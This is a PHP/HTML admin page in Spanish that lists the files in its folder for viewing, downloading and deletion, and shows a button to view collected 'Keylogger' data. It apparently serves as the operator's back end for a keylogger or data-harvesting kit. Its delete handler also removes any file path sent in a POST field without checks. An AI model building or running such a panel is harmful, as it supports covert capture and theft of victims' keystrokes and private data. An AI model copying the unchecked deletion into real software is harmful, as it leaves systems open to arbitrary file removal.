<!DOCTYPE html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>Admin</title>
<style>            
    .salto {
        display: block;
        margin-top: 10px;
    }
</style>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="card">
                    <div class="card-header">
                    <h3>Archivos - <a href='../admin' class='btn btn-success'>Regresar</a></h3>
                    </div>
                    <div class="card-body">
                        <?php
                        #verificar si el archivo existe y si es asi mostrarlo
                        if(file_exists('Keylogger.txt')){
                            echo "<a href='Keylogger.txt' class='btn btn-primary'>Ver datos del Keylogger</a>";
                            #mostrar el peso del archivo
                            $peso = filesize('Keylogger.txt');
                            echo "Peso del archivo: $peso bytes";
                        }
                        ?>
                    </div>
                    <div class="card-body">
                            <div class="form-group">
                                <table  class="table table-striped table-bordered">
                                    <thead>
                                        <tr>
                                            <th>Nombre</th>
                                            <th>Ver</th>
                                            <th>Peso</th>
                                            <th>Eliminar</th>
                                            <th>Descargar</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                <?php
                                    $directorio = opendir('./');
                                    while ($archivo = readdir($directorio)){
                                        if($archivo != '.' && $archivo != '..'&& $archivo != 'index.php' && $archivo != 'admin.php'&& $archivo != 'actualizacion'&& $archivo != 'success'  && $archivo != 'url.txt'){
                                            echo '<tr>';
                                            echo '<td>'.$archivo.'</td>';
                                            echo '<td><a class="btn btn-primary" href="'.$archivo.'">Ver</a></td>';
                                            #ver el peso del archivo
                                            $peso = filesize($archivo);
                                            echo '<td><p>'.$peso.' bytes</p></td>';
                                            echo "<form method='post'>";
                                            echo "<input type='hidden' name='archivo' value='$archivo'>";
                                            echo "<td><input type='submit' name='eliminar' value='Eliminar' class='btn btn-danger'></td>";
                                            echo "</form>";
                                            echo "<td><a href='$archivo' class='btn btn-success' download>Descargar</a></td>";
                                            #boton eliminar archivos
                                            if(isset($_POST['eliminar'])){
                                                $archivo = $_POST['archivo'];
                                                unlink($archivo);
                                                echo "<script>alert('Archivo eliminado');</script>";
                                                #recarga la pagina
                                                echo "<script>location.href='index.php';</script>";
                                            }
                                            echo '</tr>';
                                        }
                                    }
                                    ?>
                                    </tbody>
                                </table>
                            </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
</html>
                
</body>
